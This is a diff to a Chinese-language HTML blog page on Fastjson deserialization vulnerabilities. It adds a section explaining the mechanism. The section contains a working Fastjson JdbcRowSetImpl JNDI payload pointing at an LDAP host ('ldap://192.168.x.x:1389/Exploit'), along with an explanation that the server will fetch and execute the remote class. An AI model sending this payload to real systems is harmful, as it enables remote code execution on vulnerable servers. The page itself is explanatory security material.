@@ -1677,6 +1677,27 @@
 <h3 id="使用fastjson-v2版本与v1版本不兼容">使用fastjson v2版本(与v1版本不兼容)</h3>
 <h1 id="参考">参考</h1>
 <p><a href="https://github.com/YoungBear/FastjsonPoc" target="_blank">Fastjson 1.2.80版本反序列化漏洞</a></p>
+<p>反序列化机制：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma" tabindex="0"><code class="language-json" data-lang="json"><span class="p">{</span><span class="nt">"@type"</span><span class="p">:</span><span class="s2">"com.sun.rowset.JdbcRowSetImpl"</span><span class="p">,</span><span class="nt">"dataSourceName"</span><span class="p">:</span><span class="s2">"ldap://192.168.x.x:1389/Exploit"</span><span class="p">,</span><span class="nt">"autoCommit"</span><span class="p">:</span><span class="kc">true</span><span class="p">}</span><span class="err">```</span>
+
+<span class="err">当web端使用fastjson对上面的json进行反序列化时，</span>
+<span class="err">受到`@type`注解的指示，会通过反射创建`com.sun.rowset.JdbcRowSetImpl`类的对象，</span>
+<span class="err">基于fastjson的机制web端还会自动调用这个对象内部的set方法，</span>
+<span class="err">最后触发JdbcRowSetImpl类中的特定set方法，</span>
+<span class="err">访问dataSourceName指定的服务端，并下载执行服务端指定的class文件。</span></code></pre></td></tr></table>
+</div>
+</div>
 </article>
 </div>
 <div class="grow"></div>
